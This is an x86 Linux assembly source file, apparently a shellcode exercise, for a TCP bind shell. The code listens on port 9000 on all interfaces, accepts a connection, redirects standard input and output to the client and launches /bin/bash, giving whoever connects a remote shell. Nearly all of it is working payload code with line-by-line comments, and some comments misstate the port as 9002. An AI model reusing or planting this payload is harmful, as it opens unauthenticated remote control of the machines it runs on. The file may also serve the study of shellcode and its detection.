;Author : Dibyendu Sikdar
;TCP Bind Shell
;Port : 9000

global _start

section .text

_start:
	;/usr/include/linux/net.h
	;calling the socketcall 
	;int socketcall(int call, unsigned long *args);
	;EAX = syscall number for socket = 102 ( in decimal ) , 66 ( in hex ) /usr/include/i386-linux-gnu/asm/unistd_32.h
	;EBX = CALL number of SYS_SOCKET = 1 @ /usr/include/linux/net.h
	;int socket(int domain, int type, int protocol);
	;ECX = Pointer to all the parameters for socket(AF_INET,SOCK_STREAM,PROTOCOL)
	;AF_INET = 2
	;SOCK_STEAM = 1
	;PROTOCOL = 0
	;Arguments to be pushed in reverse order

	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx

	mov al,0x66
	mov bl,1
	push 0
	push 0x1
	push 0x2
	mov ecx,esp ; ecx proints to top of the stack

	
	int 0x80
	
	;eax is storing the fd 

	;bring back to stack to same state
	add esp,0xC ; 4+4+4 = 12 

	;setsocket options
	;http://www.potaroo.net/ispcol/2016-09/tcp-server.c
	;int reuseaddr=1;
	;setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&reuseaddr,sizeof(reuseaddr))
	;setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int));
	;push eax in stack first for persistence and later use
	;SYS_SETSOCKOPT  14

	;eax has socket the file descriptor so we need to save this value to stack or some register and use later by pushing it to stack
	xor edx,edx; clearing edx 
	mov edx,eax; we need to push this value as the last parameter on stack during the setsockopt() call
	xor eax,eax 
	xor ebx,ebx ; clear ebx
	mov bl,0xE ; E = 14 l SETSOCKOPT
	mov al,0x66 ; syscall for socketcall
	xor ecx,ecx ; clearing ecx

	;push all the parameters in stack in reverse order
	push 0x4  ; size of int in 4 bytes
	push esp ; if we look at the above code in comments we see it points to an interger address which is the next interger in parameter
	push 0x2  ; socket.SO_REUSEADDR => 2
	push 0x1  ; socket.SOL_SOCKET => 1
	push edx  ; edx contains the fd which was saved in eax initially
	mov ecx,esp ; ecx has pointer to esp which stores all the parameter  
	int 0x80  ; Also note on successful setsockopt() , zero will be returned 

	xor eax,eax ; clearing eax
	mov eax,edx ; bringing the fd back to eax to make it easy to remember that EAX will always keep the fd of the socket
	 	
	
	;adjust the stack to bring it to the initial state
	add esp,0x14 ; 4+4+4+4+4 = 20 = 0x14
	
	;bind socket - On Success zero is returned , else -1 or any other negative number
	;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	;SYS_BIND => 2  
	;struct sockaddr_in my_addr;
        ;my_addr.sin_family = AF_INET;
        ;my_addr.sin_port = htons(BIND_PORT); // PORT to Listen ON
        ;my_addr.sin_addr.s_addr = INADDR_ANY;// will be available over $
        ;memset(&(my_addr.sin_zero),'\0',8);// Fill the structure with N$
	;socket.INADDR_ANY => 0
	;socket.htons(9002) => 10787 => 0x2A23
	;socket.AF_INET => 2
	;bind(socket_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr))
	
	xor edx,edx ; clearing edx
	mov edx,eax ; moving the socket fd to edx again

	xor eax, eax ; clearing eax
	xor ebx, ebx ; clearing ebx
	xor ecx, ecx ; clearing ecx
	
	mov al,0x66 ; socketcall() syscall
	mov bl,0x2 ; SYS_BIND = 2
	
	;lets prepare the my_addr datastructure and push to stack in reverse order
	; Size of sin-family-2 , sin_port-2 , sin_addr.s_addr-4, sin_zero-8
	; socklen_t addrlen = 16 ; found by debugging the C code and testing the value of sizeof(struct sockaddr)
	; total size of structure should be 16 

	sub esp, 0x8      ; memset(&(my_addr.sin_zero),'\0',8);
	push 0x0          ; INADDR_ANY => 0
	push word 10275  ; socket.htons(9002) => 10787 => 0x2A23
	push word 0x2     ; AF_INET => 2
	
	mov ecx, esp

	;Now prepare the stack for the bind() functioncall

	push 0x10 ; socklen_t addrlen = 16 ; found by debugging the C code and testing the value of sizeof(struct sockaddr)
	push ecx     ; ecx point to the datastructure
	push edx     ; socket file descriptor
	mov ecx,esp  ; ecx pointer to the top of stack now
	int 0x80

	;bring the stack to same state

	add esp,0x1C ; 4+4+4+4+4+4+4 = 28 = 0x1C
	
	;bring the fd to eax from edx
	
	mov eax,edx ; eax now has fd value
	
	;listen
	;int listen(int sockfd, int backlog);
	;on success zero is returned , else a negative number
	;SYS_LISTEN => 4
	;	

	mov edx,eax ; again move the fd back to edx
	
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	
	mov al,0x66 ; syscall for socketcall()
	mov bl,0x04 ; SYS_LISTEN => 4 ; listen()
	
	;push elements in stack in reverse order of parameters
	push 0x2     ; backlog = anyvalue ; keeping 2 here
	push edx     ; push fd to stack
	mov ecx,esp
	int 0x80
	
	; restore the stack in same state
	add esp,0x8 ; 4+4 = 8	

	;accept
	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	;on success non negative value is returned , else a negative number
	;SYS_ACCEPT => 5
	;socklen_t *addrlen = 16 = 0x10
	;*** No need to push any value ***
	;As per the documentation 
	;  When addr is NULL, nothing is filled in; in this case, addrlen is  not  used, and should also be NULL.
	
	
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	
	mov eax,edx ; now eax contains socket fd
	mov edx,eax ; edx now contains fd

	xor eax,eax
	mov al, 0x66 ;socketcall() syscall
	xor ebx,ebx
	mov bl, 0x5  ;SYS_ACCEPT => 5 accept()
	
	;push 0x10 ;socklen_t *addrlen = 16 = 0x10
	;mov ecx,esp; ecx contains the address of esp
	;push ecx
	
	push ecx ; NULL ; as per documentation ;
	push ecx ; NULL ; as per documentation ;
	push edx ; socket fd
	mov ecx,esp
	int 0x80

	;restore the stack to initial state
	add esp,0xC ; 4+4+4 = 12 =0xC	

	;-----------------------------
	;close the fd socket
	;SYS_SHUTDOWN    13
		
	xor esi,esi
        xor edi,edi

        mov esi,eax ; recv fd
        mov edi,edx ; socket fd
	
	xor eax,eax
	mov al,0x66
	xor ebx,ebx
	mov bl,0xD
	mov ecx,edx
	int 0x80

	;try closing using close()
	xor eax,eax
	mov al,0x5
	mov ebx,edx
	int 0x80

	;------------------------------


	;dup2 
	;__NR_dup2            63 => 0x3F
	;eax stores new connection descriptor
	;edx stores socket descriptor
	;dup2(recvfd, 0);
        ;dup2(recvfd, 1);
        ;dup2(recvfd, 2);
	;successful call returns a new non negative value
	;int dup2(int oldfd, int newfd);

	;xor esi,esi
	;xor edi,edi

	;mov esi,eax ; recv fd
	;mov edi,edx ; socket fd
	
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	
	mov al,0x3F ; dup2 =>63 => 0x3f
	mov ebx,esi  ; recvfd
	push ecx
	pop ecx
	int 0x80

	xor eax,eax
	mov al,0x3F
	mov ebx,esi
	xor ecx,ecx
	mov cl,0x1
	int 0x80 

	xor eax,eax
	mov al,0x3F
	mov ebx,esi
	mov ecx,ecx
	mov cl,0x2
	int 0x80

	


	;execve shellcode using stack technique

	;__NR_execve 11 ; 0xB
	;'hsab'.encode('hex') => '68736162'
	;'/nib'.encode('hex') => '2f6e6962'
	;'////'.encode('hex') => '2f2f2f2f'
	;>>> 'hs/n'.encode('hex')
	;'68732f6e'
	;>>> 'ib//'.encode('hex')
	;'69622f2f'

	xor eax,eax
	push eax 
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f
	;push 0x68732f6e
	;push 0x69622f2f
	mov ebx,esp
	push eax
	mov edx,esp
	push ebx
	mov ecx,esp
	
	mov al,0xB
	int 0x80	

	;close the socket


	;keep the client fd alive and send the output to client 


	;call execl


	;exit shellcode
	xor eax,eax
	xor ebx,ebx
	mov al,1
	mov bl,1
	int 0x80				
